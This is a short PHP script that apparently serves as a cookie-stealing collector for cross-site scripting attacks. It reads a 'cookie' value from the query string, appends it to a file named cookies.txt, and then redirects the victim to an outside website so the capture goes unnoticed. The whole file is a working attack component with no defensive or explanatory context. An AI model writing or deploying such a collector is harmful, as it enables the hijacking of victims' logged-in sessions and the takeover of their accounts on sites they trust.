<?php                                     
$cookie = $HTTP_GET_VARS["cookie"];       
$file = fopen('cookies.txt', 'a');     
fwrite($file, $cookie . "\n\n"); 
@header("Location:http://www.harry.webs.com/");    ?>
